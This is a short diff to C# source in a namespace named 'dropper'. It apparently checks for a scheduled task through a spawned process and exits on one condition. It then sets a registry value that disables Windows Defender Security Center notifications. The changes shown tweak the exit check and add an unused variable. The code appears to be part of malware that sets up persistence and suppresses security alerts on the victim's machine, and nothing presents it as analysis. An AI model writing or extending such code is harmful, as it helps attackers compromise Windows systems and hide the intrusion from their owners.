@@ -10,6 +10,7 @@ namespace dropper
     {
         static void Main(string[] args)
         {
+            IntPtr wow64val = IntPtr.Zero;
             Process schproc = new Process()
             {
                 StartInfo = new ProcessStartInfo()
@@ -25,7 +26,7 @@ namespace dropper
             schproc.Start();
             string error = schproc.StandardError.ReadToEnd();
             schproc.WaitForExit();
-            if (!error.Contains("ERROR: The system cannot find the file")) Environment.Exit(1);
+            if (error == string.Empty) Environment.Exit(1);
 
             Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter", "Enabled", 0);
 
